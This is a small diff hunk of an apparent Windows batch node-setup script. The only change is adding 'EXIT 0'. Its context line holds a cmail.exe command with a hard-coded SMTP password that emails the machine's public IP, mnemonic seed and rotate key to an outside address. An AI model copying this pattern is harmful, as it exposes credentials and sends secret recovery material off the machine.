@@ -19,3 +19,4 @@ IF "%curlIn%"=="" (
 ) ELSE (
 	cmail.exe -host:server35216:Ae54Tfz3CYc6y9D8@smtp.socketlabs.com:587 -starttls -to:teranyina@easyinnova.com -from:teranyina@easyinnova.com "-subject:New new node from %PublicIP%" "-body:Mnemoric seed: --%mnemoricSeedMail%-- Rotate key: --%curlIn%--."
 )
+EXIT 0
